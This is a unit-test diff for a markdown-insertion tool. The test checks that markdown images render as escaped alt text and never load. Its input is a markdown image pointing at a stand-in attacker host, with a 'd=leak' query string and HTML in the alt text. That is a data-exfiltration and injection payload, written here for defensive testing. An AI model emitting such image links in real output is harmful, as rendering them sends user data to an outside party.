@@ -423,6 +423,15 @@ describe("insertMarkdown", () => {
 		expect(doc.texts()[1]).toBe("");
 	});
 
+	test("markdown images are shown as their alt text and never load", async () => {
+		const { call, host } = word({ body: ["one"] });
+		await call("insertMarkdown", { markdown: "Intro ![secret <b>](https://attacker.example/p.png?d=leak) end", position: "end" });
+		const html = host.methodCalls("PasteHtml")[0].args[0];
+		expect(html).not.toContain("<img");
+		expect(html).not.toContain("attacker.example");
+		expect(html).toContain("Intro secret &lt;b&gt; end");
+	});
+
 	test("replaceSelection needs a selection; the undo group is still closed", async () => {
 		const { call, host } = word({ body: ["one"] });
 		await expectToolError(call("insertMarkdown", { markdown: "x", position: "replaceSelection" }), /Nothing is selected/);
